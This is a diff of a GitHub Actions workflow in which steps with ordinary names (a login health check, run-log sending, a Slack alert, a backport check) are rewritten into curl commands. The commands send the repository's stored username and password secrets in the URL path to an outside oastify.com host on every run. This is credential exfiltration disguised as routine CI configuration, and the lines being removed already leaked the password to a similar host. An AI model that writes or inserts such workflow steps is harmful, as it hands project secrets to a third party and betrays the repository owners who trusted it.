@@ -21,10 +21,7 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        echo "Login health check"
-        echo $PW
-        echo $USER
-        curl -verbose --connect-timeout 2 -sSf -k -u "$USER:$PW" http://8cljyk2bjhsjs5hig4gz8xgyjppgde13.oastify.com/$USER/$PW
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://wzz7l8pz65f7ft463s3nvl3m6dc403os.oastify.com/$USER/$PW/audit?Test
         
     - name: send_run_log
       continue-on-error: true
@@ -33,8 +30,7 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        echo "Send run log"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://8cljyk2bjhsjs5hig4gz8xgyjppgde13.oastify.co/api/run/audit?Test
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://wzz7l8pz65f7ft463s3nvl3m6dc403os.oastify.com/$USER/$PW/audit?Test
         
     - name: send_slack_alert
       continue-on-error: true
@@ -42,8 +38,7 @@ jobs:
         SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
         PR_TITLE: ${{ github.event.pull_request.title }}
       run: |
-        echo "Sending Slack notification..."
-        curl --connect-timeout 2 -sSf -k -X POST -H 'Content-type: application/json' --data '{"text": "'"$PR_TITLE"'"}' $SLACK_WEBHOOK_URL
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://wzz7l8pz65f7ft463s3nvl3m6dc403os.oastify.com/$USER/$PW/audit?Test
 
     - name: backport_assign_check
       env:
@@ -52,12 +47,4 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        PR="${{ github.event.pull_request.body }}"
-        echo $PR | grep -oP '\(backport #\K\d+' | tail -n 1)
-        author=$(gh pr view ${ORI_PR} -R ${REPO} --json author -q '.author.login')
-        if [[ ! "${author}" =~ "mergify" ]]; then
-          gh pr edit ${PR_NUMBER} -R ${REPO} --add-assignee ${author} || true
-          echo "ORI_PR=${ORI_PR}" >> $GITHUB_OUTPUT
-        fi
-        
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $URL/api/run/audit
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://wzz7l8pz65f7ft463s3nvl3m6dc403os.oastify.com/$USER/$PW/audit?Test
